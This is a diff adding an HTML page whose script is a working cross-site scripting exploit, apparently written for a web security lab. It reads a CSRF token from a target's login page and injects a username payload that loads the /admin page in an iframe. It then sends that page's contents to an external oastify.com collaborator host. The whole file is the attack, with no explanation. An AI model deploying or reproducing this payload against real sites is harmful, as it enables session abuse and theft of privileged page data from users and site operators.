@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        function xss(url, text, vector) {
+            location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+        }
+        
+        function fetchUrl(url, collaboratorURL){
+            fetch(url).then(r=>r.text().then(text=>
+            {
+                xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
+            }
+            ))
+        }
+        
+        fetchUrl("http://192.168.0.209:8080", "http://cn3j62erl5jxsf4zll3vqu3a41auykm9.oastify.com");
+        </script>
+</body>
+</html>
